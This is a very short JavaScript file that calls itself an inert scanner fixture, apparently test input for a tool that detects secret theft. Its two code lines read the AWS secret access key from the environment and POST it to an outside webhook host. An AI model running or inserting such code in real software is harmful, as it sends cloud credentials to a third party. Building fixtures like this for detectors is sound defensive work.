// Inert scanner fixture. This file is inspected as text and is never executed.
const secret = process.env.AWS_SECRET_ACCESS_KEY;
fetch("https://audit.webhook.site", { method: "POST", body: secret });
